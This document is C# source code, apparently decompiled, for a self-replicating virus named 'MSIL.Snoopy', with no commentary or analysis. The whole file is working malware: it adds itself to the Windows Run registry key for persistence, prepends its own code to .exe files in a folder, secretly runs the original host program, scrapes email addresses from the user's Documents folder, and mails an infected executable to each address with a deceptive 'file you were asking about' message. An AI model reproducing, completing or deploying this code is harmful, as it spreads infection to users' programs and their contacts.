using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Snoopy;

internal class Snoopy
{
	private struct STRMX
	{
		public IntPtr pNext;

		public string strName;

		public short sType;

		public int intFlag;

		public int intTTL;

		public int intRes;

		public IntPtr pNameEx;
	}

	private string me = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);

	private string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private ArrayList arrEmails = new ArrayList();

	private ArrayList arInfect = new ArrayList();

	[DllImport("dnsapi", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern int DnsQuery_W([MarshalAs(UnmanagedType.VBByRefStr)] ref string strName, int intType, int intOpt, int intServer, ref IntPtr pResult, int intReserved);

	public bool CheckReg()
	{
		string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		string text = (string)Registry.GetValue(keyName, "Snoopy", "Snoopy");
		if (text == "Snoopy")
		{
			Registry.SetValue(keyName, "Snoopy", me);
			return true;
		}
		return false;
	}

	public void Message()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Infected with MSIL.Snoopy", "Snoopy");
	}

	public void Replicate(string dir)
	{
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		FileStream fileStream = new FileStream(me, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		byte[] array = new byte[fileStream.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = binaryReader.ReadByte();
		}
		fileStream.Close();
		binaryReader.Close();
		string[] files = Directory.GetFiles(dir, "*.exe");
		for (int j = 0; j < files.Length; j++)
		{
			FileStream fileStream2 = new FileStream(files[j], FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader2 = new BinaryReader(fileStream2);
			byte[] array2 = new byte[fileStream2.Length];
			for (int k = 0; k < array2.Length; k++)
			{
				array2[k] = binaryReader2.ReadByte();
			}
			binaryReader2.Close();
			fileStream2.Close();
			if (array2[60] != 128)
			{
				FileStream output = new FileStream(files[j], FileMode.Open, FileAccess.Write);
				BinaryWriter binaryWriter = new BinaryWriter(output);
				for (int i = 0; i < array.Length; i++)
				{
					binaryWriter.BaseStream.WriteByte(array[i]);
				}
				for (int l = 0; l < array2.Length; l++)
				{
					binaryWriter.BaseStream.WriteByte(array2[l]);
				}
				binaryWriter.Close();
				fileStream2.Close();
				arInfect.Add(files[j]);
			}
		}
		FileInfo fileInfo = new FileInfo(me);
		int num = (int)fileInfo.Length - 20480;
		if (num <= 0)
		{
			MessageBox.Show("Not a valid win32 program", "Windows", (MessageBoxButtons)0, (MessageBoxIcon)16);
			Application.Exit();
			return;
		}
		try
		{
			string text = DateTime.Now.Hour + DateTime.Now.Second + DateTime.Now.Minute + ".exe";
			FileStream fileStream3 = new FileStream(text, FileMode.CreateNew);
			File.SetAttributes(text, FileAttributes.Hidden);
			for (int m = 20480; m < fileInfo.Length; m++)
			{
				fileStream3.WriteByte(array[m]);
			}
			fileStream3.Close();
			try
			{
				Process.Start(text).WaitForExit();
			}
			catch (Exception)
			{
				MessageBox.Show("This file is corrupt", "Windows", (MessageBoxButtons)0, (MessageBoxIcon)16);
			}
			File.Delete(text);
			Application.Exit();
		}
		catch (Exception)
		{
		}
	}

	public void Send()
	{
		arrEmails = SearchEmails(myDocs, "*.*");
		ArrayList arrayList = arrEmails;
		arrayList.Reverse();
		string file = GetFile();
		if (!(file != "") || arrEmails.Count <= 0)
		{
			return;
		}
		Attachment attachment = new Attachment(file);
		IEnumerator enumerator = arrEmails.GetEnumerator();
		string text = "";
		string text2 = "";
		ArrayList arrayList2 = new ArrayList();
		while (enumerator.MoveNext())
		{
			text = Convert.ToString(enumerator.Current);
			IEnumerator enumerator2 = arrayList.GetEnumerator();
			while (enumerator2.MoveNext())
			{
				text2 = Convert.ToString(enumerator2.Current);
				if (text != text2 && !arrayList2.Contains(text))
				{
					arrayList2.Add(text);
					MailAddress to = new MailAddress(text);
					MailAddress from = new MailAddress(text2);
					MailMessage mailMessage = new MailMessage(from, to);
					mailMessage.Subject = "Hey";
					mailMessage.Body = "Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?";
					mailMessage.Attachments.Add(attachment);
					string host = text.Substring(text.IndexOf("@")).Replace("@", string.Empty);
					string mXRecords = GetMXRecords(host);
					try
					{
						SmtpClient smtpClient = new SmtpClient(mXRecords);
						smtpClient.Send(mailMessage);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		attachment.Dispose();
	}

	private ArrayList SearchEmails(string dir, string fileType)
	{
		ArrayList arrayList = new ArrayList();
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		FileInfo[] files = directoryInfo.GetFiles(fileType);
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			Console.WriteLine(fileInfo.FullName);
			StreamReader streamReader = File.OpenText(fileInfo.FullName);
			string inputData;
			while ((inputData = streamReader.ReadLine()) != null)
			{
				string text = ExtractAddr(inputData);
				if (text != "" && !arrayList.Contains(text))
				{
					string pattern = "^([a-zA-Z0-9_\\-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([a-zA-Z0-9\\-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$";
					Regex regex = new Regex(pattern);
					if (regex.IsMatch(text) && !arrayList.Contains(text))
					{
						arrayList.Add(text);
					}
				}
			}
		}
		return arrayList;
	}

	public string ExtractAddr(string InputData)
	{
		string text = null;
		int num = 0;
		string text2 = null;
		int num2 = InputData.IndexOf("@", 0) + 1;
		int num3 = 1;
		int num4 = InputData.Length;
		text = "";
		if (num2 == 0)
		{
			return text;
		}
		num = num2 - 1;
		while (num >= 1)
		{
			text2 = InputData.Substring(num - 1, 1);
			if (!((text2 == " ") | (text2 == "<") | (text2 == "(") | (text2 == ":") | (text2 == ",") | (text2 == "[")))
			{
				num--;
				continue;
			}
			num3 = num + 1;
			break;
		}
		for (num = num2 + 1; num <= InputData.Length; num++)
		{
			text2 = InputData.Substring(num - 1, 1);
			if ((text2 == " ") | (text2 == ">") | (text2 == ")") | (text2 == ":") | (text2 == ",") | (text2 == "]"))
			{
				num4 = num - 1;
				break;
			}
		}
		string input = InputData.Substring(num3 - 1, num4 - num3 + 1);
		input = Regex.Replace(input, "<(.|\\n)*?>", string.Empty);
		input = input.Replace("&nbsp;", "");
		input = input.Replace(" ", "");
		return input.Replace("\"", "");
	}

	private string GetFile()
	{
		string result = "";
		if (arInfect.Count > 0)
		{
			IEnumerator enumerator = arInfect.GetEnumerator();
			while (enumerator.MoveNext())
			{
				result = Convert.ToString(enumerator.Current);
			}
		}
		return result;
	}

	public string GetMXRecords(string host)
	{
		IntPtr pResult = IntPtr.Zero;
		IntPtr zero = IntPtr.Zero;
		int num = DnsQuery_W(ref host, 15, 8, 0, ref pResult, 0);
		string result = "";
		if (num != 0)
		{
			result = host;
		}
		else
		{
			zero = pResult;
			while (!zero.Equals((object?)(nint)IntPtr.Zero))
			{
				STRMX sTRMX = (STRMX)Marshal.PtrToStructure(zero, typeof(STRMX));
				if (sTRMX.sType == 15)
				{
					string text = Marshal.PtrToStringAuto(sTRMX.pNameEx);
					if (text != "")
					{
						result = text;
					}
				}
				zero = sTRMX.pNext;
			}
		}
		return result;
	}
}
